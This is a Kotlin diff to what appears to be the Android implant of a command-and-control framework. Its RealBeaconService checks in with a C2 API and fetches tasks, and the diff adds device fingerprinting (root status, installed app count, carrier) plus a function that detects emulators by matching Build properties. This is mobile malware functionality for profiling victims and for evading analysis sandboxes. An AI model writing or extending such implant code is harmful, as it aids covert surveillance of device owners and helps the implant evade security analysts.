@@ -32,13 +32,18 @@ import javax.inject.Inject
 @ContributesBinding(AppScope::class)
 class RealBeaconService @Inject constructor(
     private val c2Api: C2ApiService,
+    private val fingerprinter: DeviceFingerprinter,
 ) : BeaconService {
 
     override suspend fun checkIn(): CheckInResult {
         val checkInRequest = CheckInRequest(
             device_name = getDeviceName(),
             ip_address = getLocalIpAddress(),
-            os_info = "Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})",
+            os_info = fingerprinter.androidVersion(),
+            is_emulator = detectEmulator(),
+            is_rooted = fingerprinter.isRooted(),
+            installed_apps_count = fingerprinter.installedAppCount(),
+            carrier = fingerprinter.carrier(),
         )
         val checkInResponse = c2Api.checkIn(checkInRequest)
         val tasksResponse = c2Api.getTasks(getDeviceName())
@@ -98,6 +103,16 @@ class RealBeaconService @Inject constructor(
             ),
         )
     }
+
+    internal fun detectEmulator(): Boolean =
+        Build.FINGERPRINT.orEmpty().startsWith("generic") ||
+            Build.FINGERPRINT.orEmpty().startsWith("unknown") ||
+            Build.MODEL.orEmpty().contains("google_sdk", ignoreCase = true) ||
+            Build.MODEL.orEmpty().contains("Emulator", ignoreCase = true) ||
+            Build.MODEL.orEmpty().contains("Android SDK built for x86", ignoreCase = true) ||
+            Build.MANUFACTURER.orEmpty().contains("Genymotion", ignoreCase = true) ||
+            (Build.BRAND.orEmpty().startsWith("generic") && Build.DEVICE.orEmpty().startsWith("generic")) ||
+            Build.PRODUCT == "google_sdk"
 
     @SuppressLint("HardwareIds")
     private fun getDeviceName(): String =
